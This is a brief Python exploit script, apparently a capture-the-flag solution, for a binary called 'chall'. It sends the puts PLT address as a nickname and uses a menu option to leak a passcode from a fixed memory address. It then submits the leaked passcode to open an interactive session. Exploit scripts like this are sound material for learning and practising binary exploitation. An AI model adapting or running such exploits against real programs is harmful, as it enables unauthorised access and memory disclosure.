#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

passcode_address = 0x404060
puts_plt = exe.plt.puts

sa(b'[*] NickName> ', p64(puts_plt))
sla(b'> ', b'15')
sa(b'>', str(passcode_address).encode())

ru(b'> ')
# print(ru(b'\n'))
passcode = u64(ru(b'\n').strip())
print(f'Passcode leak: {passcode}')

sla(b'> ', b'2')
sa(b'>', str(passcode).encode())
interactive()
